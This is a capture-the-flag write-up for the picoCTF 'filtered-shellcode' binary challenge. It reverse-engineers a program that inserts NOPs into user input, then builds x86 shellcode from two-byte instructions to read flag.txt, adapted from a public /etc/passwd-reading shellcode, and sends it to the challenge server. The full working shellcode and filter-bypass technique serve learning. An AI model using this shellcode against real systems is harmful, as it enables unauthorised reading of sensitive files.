# filtered-shellcode
Category: Binary Exploitation, 160 points

## Description
> A program that just runs the code you give it? That seems kinda boring...

A binary file was attached.

## Solution

When we run the binary, it asks us for code to run:

```console
┌──(user@kali)-[/media/sf_CTFs/pico/filtered-shellcode]
└─$ ./fun
Give me code to run:
```

Let's see what it does under the hood:

```c
undefined4 main(undefined param_1)

{
  int iVar1;
  char user_input [1000];
  char local_15;
  uint i;
  undefined1 *local_10;
  
  local_10 = &param_1;
  setbuf(stdout,(char *)0x0);
  i = 0;
  local_15 = 0;
  puts("Give me code to run:");
  iVar1 = fgetc(stdin);
  local_15 = (char)iVar1;
  while ((local_15 != '\n' && (i < 1000))) {
    user_input[i] = local_15;
    iVar1 = fgetc(stdin);
    local_15 = (char)iVar1;
    i = i + 1;
  }
  if ((i & 1) != 0) {
    user_input[i] = 0x90;
    i = i + 1;
  }
  execute((int)user_input,i);
  return 0;
}
```

Looks like it reads up to 1000 bytes from the user, then calls `execute`:

```c
void execute(int user_input,int input_len)

{
  int iVar1;
  uint uVar2;
  uint uVar3;
  undefined4 uStack48;
  undefined dest_buf [8];
  undefined *local_24;
  undefined *local_20;
  uint local_1c;
  uint local_18;
  int local_14;
  uint i;
  int alignment;
  
  uStack48 = 0x8048502;
  if ((user_input != 0) && (input_len != 0)) {
    local_18 = input_len * 2;
    local_1c = local_18;
    uVar2 = (local_18 + 0x10) / 0x10;
    alignment = uVar2 * -0x10;
    local_20 = dest_buf + alignment;
    local_14 = 0;
    i = 0;
    while (iVar1 = local_14, i < local_18) {
      uVar3 = (uint)((int)i >> 0x1f) >> 0x1e;
      if ((int)((i + uVar3 & 3) - uVar3) < 2) {
        local_14 = local_14 + 1;
        dest_buf[i + alignment] = *(undefined *)(user_input + iVar1);
      }
      else {
        dest_buf[i + alignment] = 0x90;
      }
      i = i + 1;
    }
    dest_buf[local_18 + alignment] = 0xc3;
    local_24 = dest_buf + alignment;
    (&uStack48)[uVar2 * -4] = 0x80485cb;
    (*(code *)(dest_buf + alignment))();
    return;
  }
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```

We can see that this function somehow manipulates our input, then calls it as code. What is this manipulation? We can try to analyze the code but it would be very helpful to just run an example and check the result in the debugger.

We'll enter `abcdefgh` as the input, and set a breakpoint at `(*(code *)(dest_buf + alignment))()` - right before the program jumps to our manipulated shellcode.

```
gef>  b *0x080485c9
Breakpoint 1 at 0x80485c9
gef>  r
Starting program: /media/sf_CTFs/pico/filtered-shellcode/fun
Give me code to run:
abcdefgh
Breakpoint 1, 0x080485c9 in execute ()
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffd570  →  0x90906261
$ebx   : 0xffffd590  →  0xf7fb65e0  →  0x00000000
$ecx   : 0xffffd570  →  0x90906261
$edx   : 0xffffd570  →  0x90906261
$esp   : 0xffffd570  →  0x90906261
$ebp   : 0xffffd5b8  →  0xffffd9c8  →  0x00000000
$esi   : 0xf7fb5000  →  0x001e4d6c
$edi   : 0xf7fb5000  →  0x001e4d6c
$eip   : 0x080485c9  →  <execute+211> call eax
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd570│+0x0000: 0x90906261   ← $esp
0xffffd574│+0x0004: 0x90906463
0xffffd578│+0x0008: 0x90906665
0xffffd57c│+0x000c: 0x90906867
0xffffd580│+0x0010: 0xf7fb5dc3  →  0x000000f7
0xffffd584│+0x0014: 0xf7ddac28  →  0x000031ea
0xffffd588│+0x0018: 0x00000014
0xffffd58c│+0x001c: 0x08048502  →  <execute+12> add eax, 0x1afe
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x80485c0 <execute+202>    mov    eax, DWORD PTR [ebp-0x1c]
    0x80485c3 <execute+205>    mov    DWORD PTR [ebp-0x20], eax
    0x80485c6 <execute+208>    mov    eax, DWORD PTR [ebp-0x20]
 →  0x80485c9 <execute+211>    call   eax
    0x80485cb <execute+213>    mov    esp, ebx
    0x80485cd <execute+215>    nop
    0x80485ce <execute+216>    mov    ebx, DWORD PTR [ebp-0x4]
    0x80485d1 <execute+219>    leave
    0x80485d2 <execute+220>    ret
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
*0xffffffffffffd570 (
   [sp + 0x0] = 0x90906261
)
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "fun", stopped 0x80485c9 in execute (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x80485c9 → execute()
[#1] 0x80486a8 → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef>  hexdump byte $eax
0xffffd570     61 62 90 90 63 64 90 90 65 66 90 90 67 68 90 90    ab..cd..ef..gh..
0xffffd580     c3 5d fb f7 28 ac dd f7 14 00 00 00 02 85 04 08    .]..(...........
0xffffd590     e0 65 fb f7 00 50 fb f7 70 d5 ff ff 70 d5 ff ff    .e...P..p...p...
0xffffd5a0     10 00 00 00 10 00 00 00 08 00 00 00 10 00 00 00    ................
```

We can see that after every two bytes of our input, the program inserted two NOPs (0x90). Going back to the code, this makes sense.

Now, suppose we would enter `"mov eax, 17"` as our shellcode:

```console
┌──(user@kali)-[/media/sf_CTFs/pico/filtered-shellcode]
└─$ pwn asm -f hex "mov eax, 17"
b811000000
```

This would turn to:
```
b81190900000909000
```

Which would be interpreted as:

```console
┌──(user@kali)-[/media/sf_CTFs/pico/filtered-shellcode]
└─$ pwn disasm "b81190900000909000"
   0:    b8 11 90 90 00           mov    eax,  0x909011
   5:    00                       .byte 0x0
   6:    90                       nop
   7:    90                       nop
```

Not exactly what we wanted. So, our problem is that we can't just enter any shellcode as input. Our easiest workaround would be to work with assembly instructions of exactly two bytes. If we need an instruction of one byte, we can pad it with a NOP. If we need an instruction of more than two bytes, we'll just have to find a way to refactor it to multiple instructions of two bytes.

We want to read the flag, which is usually saved as `"flag.txt"` in the challenge directory. So, we'll use a shellcode to print the contents of a file. 

[Here's](http://shell-storm.org/shellcode/files/shellcode-842.php) a short shellcode to read the contents of `/etc/passwd`:

```console
┌──(user@kali)-[/media/sf_CTFs/pico/filtered-shellcode]
└─$ pwn disasm "31C9F7E1B00551687373776468632F7061682F2F657489E3CD809391B00331D266BAFF0F42CD809231C0B004B301CD8093CD80"
   0:    31 c9                    xor    ecx,  ecx
   2:    f7 e1                    mul    ecx
   4:    b0 05                    mov    al,  0x5
   6:    51                       push   ecx
   7:    68 73 73 77 64           push   0x64777373
   c:    68 63 2f 70 61           push   0x61702f63
  11:    68 2f 2f 65 74           push   0x74652f2f
  16:    89 e3                    mov    ebx,  esp
  18:    cd 80                    int    0x80
  1a:    93                       xchg   ebx,  eax
  1b:    91                       xchg   ecx,  eax
  1c:    b0 03                    mov    al,  0x3
  1e:    31 d2                    xor    edx,  edx
  20:    66 ba ff 0f              mov    dx,  0xfff
  24:    42                       inc    edx
  25:    cd 80                    int    0x80
  27:    92                       xchg   edx,  eax
  28:    31 c0                    xor    eax,  eax
  2a:    b0 04                    mov    al,  0x4
  2c:    b3 01                    mov    bl,  0x1
  2e:    cd 80                    int    0x80
  30:    93                       xchg   ebx,  eax
  31:    cd 80                    int    0x80
```

First, we'd like to replace the `/etc/passwd` with `flag.txt`:

```assembly
push   0x64777373 ; "dwss"
push   0x61702f63 ; "ap/c"
push   0x74652f2f ; "te//"

 ; Turn into:

push   0x7478742e ; "txt."
push   0x67616c66 ; "galf"

```

Encoded, we get:

```console
┌──(user@kali)-[/media/sf_CTFs/pico/filtered-shellcode]
└─$ pwn asm -f hex "push   0x7478742e; push   0x67616c66;" | xxd -p -r | pwn disasm
   0:    68 2e 74 78 74           push   0x7478742e
   5:    68 66 6c 61 67           push   0x67616c66
```

So, each of these `push` instructions are 5 bytes long. How do we get the same result with just 2-byte instructions?

Well, one way to express `0x7478742e` is by factorizing it to prime factors:

```python
>>> hex(2 * 5843 * 167213)
'0x7478742e'
```

So, `push 0x7478742e` could become:

```assembly
mov eax, 167213
mov ebx, 5843
mul ebx
mov ebx, 2
mul ebx
push eax
```

However, this code still requires instructions larger than two bytes. But what if we make sure that none of the constants are larger than 256?

```python
>>> hex(2 * ((2 * 23 * 127)+1) * ((2 * 2 * 17 * ((2 * ((2 * 2 * ((2 * 3 * 3 * 17)+1))+1))+1))+1))
'0x7478742e'
```

Then, we can rewrite this in assembly as follows:

```console
┌──(user@kali)-[/media/sf_CTFs/pico/filtered-shellcode]
└─$ pwn disasm "31C031DBB011B303F7E3F7E3B302F7E3D1EB01D8B302F7E3F7E3D1EB01D8B302F7E3D1EB01D8B311F7E3B302F7E3F7E3D1EB01D8509031C0B07FB317F7E3B302F7E3D1EB01D8B302F7E35B90F7E35090"
   0:    31 c0                    xor    eax,  eax
   2:    31 db                    xor    ebx,  ebx
   4:    b0 11                    mov    al,  0x11
   6:    b3 03                    mov    bl,  0x3
   8:    f7 e3                    mul    ebx
   a:    f7 e3                    mul    ebx
   c:    b3 02                    mov    bl,  0x2
   e:    f7 e3                    mul    ebx
  10:    d1 eb                    shr    ebx,  1
  12:    01 d8                    add    eax,  ebx
  14:    b3 02                    mov    bl,  0x2
  16:    f7 e3                    mul    ebx
  18:    f7 e3                    mul    ebx
  1a:    d1 eb                    shr    ebx,  1
  1c:    01 d8                    add    eax,  ebx
  1e:    b3 02                    mov    bl,  0x2
  20:    f7 e3                    mul    ebx
  22:    d1 eb                    shr    ebx,  1
  24:    01 d8                    add    eax,  ebx
  26:    b3 11                    mov    bl,  0x11
  28:    f7 e3                    mul    ebx
  2a:    b3 02                    mov    bl,  0x2
  2c:    f7 e3                    mul    ebx
  2e:    f7 e3                    mul    ebx
  30:    d1 eb                    shr    ebx,  1
  32:    01 d8                    add    eax,  ebx
  34:    50                       push   eax
  35:    90                       nop
  36:    31 c0                    xor    eax,  eax
  38:    b0 7f                    mov    al,  0x7f
  3a:    b3 17                    mov    bl,  0x17
  3c:    f7 e3                    mul    ebx
  3e:    b3 02                    mov    bl,  0x2
  40:    f7 e3                    mul    ebx
  42:    d1 eb                    shr    ebx,  1
  44:    01 d8                    add    eax,  ebx
  46:    b3 02                    mov    bl,  0x2
  48:    f7 e3                    mul    ebx
  4a:    5b                       pop    ebx
  4b:    90                       nop
  4c:    f7 e3                    mul    ebx
  4e:    50                       push   eax
  4f:    90                       nop
```

Notice how we padded 1-byte instructions with a NOP. 

The same goes for `0x67616c66`:

```python
>>> hex(2 * 5 * 19 * ((2 * 2 * 2 * 3 * 43)+1) * ((2 * 2 * 47 * 47)+1))
'0x67616c66'
```

So:

```console
┌──(user@kali)-[/media/sf_CTFs/pico/filtered-shellcode]
└─$ pwn disasm "31C031DBB02FF7E0B302F7E3F7E3D1EB01D8509031C0B02BB303F7E3B302F7E3F7E3F7E3D1EB01D8B313F7E3B305F7E3B302F7E35B90F7E35090"
   0:    31 c0                    xor    eax,  eax
   2:    31 db                    xor    ebx,  ebx
   4:    b0 2f                    mov    al,  0x2f
   6:    f7 e0                    mul    eax
   8:    b3 02                    mov    bl,  0x2
   a:    f7 e3                    mul    ebx
   c:    f7 e3                    mul    ebx
   e:    d1 eb                    shr    ebx,  1
  10:    01 d8                    add    eax,  ebx
  12:    50                       push   eax
  13:    90                       nop
  14:    31 c0                    xor    eax,  eax
  16:    b0 2b                    mov    al,  0x2b
  18:    b3 03                    mov    bl,  0x3
  1a:    f7 e3                    mul    ebx
  1c:    b3 02                    mov    bl,  0x2
  1e:    f7 e3                    mul    ebx
  20:    f7 e3                    mul    ebx
  22:    f7 e3                    mul    ebx
  24:    d1 eb                    shr    ebx,  1
  26:    01 d8                    add    eax,  ebx
  28:    b3 13                    mov    bl,  0x13
  2a:    f7 e3                    mul    ebx
  2c:    b3 05                    mov    bl,  0x5
  2e:    f7 e3                    mul    ebx
  30:    b3 02                    mov    bl,  0x2
  32:    f7 e3                    mul    ebx
  34:    5b                       pop    ebx
  35:    90                       nop
  36:    f7 e3                    mul    ebx
  38:    50                       push   eax
  39:    90                       nop
```

Now we refactor `mov    dx,  0xfff` as:

```console
┌──(user@kali)-[/media/sf_CTFs/pico/filtered-shellcode]
└─$ pwn disasm "509031C031D2B240B040F7E250905A9031C0B00129C25890"
   0:    50                       push   eax
   1:    90                       nop
   2:    31 c0                    xor    eax,  eax
   4:    31 d2                    xor    edx,  edx
   6:    b2 40                    mov    dl,  0x40
   8:    b0 40                    mov    al,  0x40
   a:    f7 e2                    mul    edx
   c:    50                       push   eax
   d:    90                       nop
   e:    5a                       pop    edx
   f:    90                       nop
  10:    31 c0                    xor    eax,  eax
  12:    b0 01                    mov    al,  0x1
  14:    29 c2                    sub    edx,  eax
  16:    58                       pop    eax
  17:    90                       nop
```

Our full shellcode becomes:

```assembly
xor    ecx,ecx
mul    ecx
push   ecx
nop

xor eax, eax
xor ebx, ebx
mov al, 17
mov bl, 3
mul ebx
mul ebx
mov bl, 2
mul ebx
shr ebx, 1
add eax, ebx
mov bl, 2
mul ebx
mul ebx
shr ebx, 1
add eax, ebx
mov bl, 2
mul ebx
shr ebx, 1
add eax, ebx
mov bl, 17
mul ebx
mov bl, 2
mul ebx
mul ebx
shr ebx, 1
add eax, ebx
push eax
nop
xor eax, eax
mov al, 127
mov bl, 23
mul ebx
mov bl, 2
mul ebx
shr ebx, 1
add eax, ebx
mov bl, 2
mul ebx
pop ebx
nop
mul ebx
push eax
nop

xor eax, eax
xor ebx, ebx
mov al, 47
mul eax
mov bl, 2
mul ebx
mul ebx
shr ebx, 1
add eax, ebx
push eax
nop
xor eax, eax
mov al, 43
mov bl, 3
mul ebx
mov bl, 2
mul ebx
mul ebx
mul ebx
shr ebx, 1
add eax, ebx
mov bl, 19
mul ebx
mov bl, 5
mul ebx
mov bl, 2
mul ebx
pop ebx
nop
mul ebx
push eax
nop

xor eax, eax
mov    al,0x5
mov    ebx,esp
int    0x80
xchg   ebx,eax
nop
xchg   ecx,eax
nop
mov    al,0x3
xor    edx,edx

push eax
nop
xor eax, eax
xor edx, edx
mov dl, 64
mov al, 64
mul edx
push eax
nop
pop edx
nop
xor eax, eax
mov al, 1
sub edx, eax
pop eax
nop

inc    edx
nop
int    0x80
xchg   edx,eax
nop
xor    eax,eax
mov    al,0x4
mov    bl,0x1
int    0x80
xchg   ebx,eax
nop
int    0x80 
```

Let's try it:

```console
┌──(user@kali)-[/media/sf_CTFs/pico/filtered-shellcode]
└─$ printf "\x31\xC9\xF7\xE1\x51\x90\x31\xC0\x31\xDB\xB0\x11\xB3\x03\xF7\xE3\xF7\xE3\xB3\x02\xF7\xE3\xD1\xEB\x01\xD8\xB3\x02\xF7\xE3\xF7\xE3\xD1\xEB\x01\xD8\xB3\x02\xF7\xE3\xD1\xEB\x01\xD8\xB3\x11\xF7\xE3\xB3\x02\xF7\xE3\xF7\xE3\xD1\xEB\x01\xD8\x50\x90\x31\xC0\xB0\x7F\xB3\x17\xF7\xE3\xB3\x02\xF7\xE3\xD1\xEB\x01\xD8\xB3\x02\xF7\xE3\x5B\x90\xF7\xE3\x50\x90\x31\xC0\x31\xDB\xB0\x2F\xF7\xE0\xB3\x02\xF7\xE3\xF7\xE3\xD1\xEB\x01\xD8\x50\x90\x31\xC0\xB0\x2B\xB3\x03\xF7\xE3\xB3\x02\xF7\xE3\xF7\xE3\xF7\xE3\xD1\xEB\x01\xD8\xB3\x13\xF7\xE3\xB3\x05\xF7\xE3\xB3\x02\xF7\xE3\x5B\x90\xF7\xE3\x50\x90\x31\xC0\xB0\x05\x89\xE3\xCD\x80\x93\x90\x91\x90\xB0\x03\x31\xD2\x50\x90\x31\xC0\x31\xD2\xB2\x40\xB0\x40\xF7\xE2\x50\x90\x5A\x90\x31\xC0\xB0\x01\x29\xC2\x58\x90\x42\x90\xCD\x80\x92\x90\x31\xC0\xB0\x04\xB3\x01\xCD\x80\x93\x90\xCD\x80\n" | nc mercury.picoctf.net 16460
Give me code to run:
picoCTF{th4t_w4s_fun_f1ed6f7952ff4071}
```